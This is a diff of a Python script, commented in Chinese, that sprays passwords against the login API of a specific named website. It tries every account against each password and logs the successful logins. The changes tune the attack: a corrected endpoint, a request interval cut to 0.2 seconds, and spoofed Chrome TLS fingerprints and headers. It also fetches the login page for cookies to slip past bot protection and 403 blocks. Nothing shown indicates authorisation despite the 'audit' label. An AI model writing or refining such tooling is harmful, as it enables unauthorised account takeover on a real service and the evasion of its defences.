@@ -2,13 +2,14 @@ import os
 from curl_cffi import requests
 import time
 
-# 目标网址（已根据抓包更新）
-LOGIN_URL = "https://sanfen.gonghailin.xin/api/v1/passport/auth/login"
+# 目标网址（已修正 API 路径）
+LOGIN_URL = "https://sanfen.gonghailin.xin/api/passport/auth/login"
 BASE_DOMAIN = "https://sanfen.gonghailin.xin"
+LOGIN_PAGE = "https://sanfen.gonghailin.xin/login"
 
 USER_FIELD = "email"
 PWD_FIELD = "password"
-REQUEST_INTERVAL = 1
+REQUEST_INTERVAL = 0.2
 REQUEST_TIMEOUT = (3, 6)         # (连接超时秒数, 读取超时秒数)
 MAX_RUNTIME_MINUTES = 350        # 全局最大运行时间（分钟）
 RESULT_FILE_PATH = "success_log.txt"
@@ -82,7 +83,7 @@ def main():
             os.remove(path)
 
     total_tasks = len(passwords) * len(usernames)
-    print(f"[*] 全自动审计开始（GitHub 兼容版 / 强效过盾），共 {len(usernames)} 个账号，{len(passwords)} 个密码（总组合数: {total_tasks}）")
+    print(f"[*] 全自动审计开始，共 {len(usernames)} 个账号，{len(passwords)} 个密码（总组合数: {total_tasks}）")
     print(f"[*] 模式: 密码优先（所有账号轮流尝试同一个密码）")
     print(f"[*] 目标: {LOGIN_URL}")
     if MAX_RUNTIME_MINUTES:
@@ -98,16 +99,16 @@ def main():
     consecutive_500_count = 0
     stop_reason = None
 
-    # 使用 curl_cffi 模拟浏览器 TLS 指纹 (impersonate="chrome120") 绕过盾
-    with requests.Session(impersonate="chrome120") as session:
+    # 使用 curl_cffi 模拟浏览器指纹并对齐抓包头
+    with requests.Session(impersonate="chrome112") as session:
         session.headers.update({
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
             "Accept": "application/json, text/plain, */*",
             "Accept-Language": "zh-CN,zh;q=0.9",
             "Content-Type": "application/json",
             "Origin": BASE_DOMAIN,
-            "Referer": f"{BASE_DOMAIN}/",
-            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            "Referer": LOGIN_PAGE,  # 对齐抓包中的 /login 来源
+            "sec-ch-ua": '"Not:A-Brand";v="99", "Chromium";v="112"',
             "sec-ch-ua-mobile": "?0",
             "sec-ch-ua-platform": '"Windows"',
             "sec-fetch-dest": "empty",
@@ -115,9 +116,9 @@ def main():
             "sec-fetch-site": "same-origin"
         })
 
-        # 先访问一次首页初始化 Cookie
+        # 先访问登录页以获取 Cookie（如 cw_conversation 等），避免 403 拦截
         try:
-            session.get(BASE_DOMAIN, timeout=5)
+            session.get(LOGIN_PAGE, timeout=5)
         except Exception:
             pass
 
@@ -148,7 +149,7 @@ def main():
 
                 try:
                     payload = {USER_FIELD: username, PWD_FIELD: password}
-                    # 修改为 json=payload 以匹配接口的 application/json 要求
+                    # 匹配抓包的 application/json，使用 json=payload
                     response = session.post(LOGIN_URL, json=payload, timeout=REQUEST_TIMEOUT)
 
                     if response.status_code == 500:
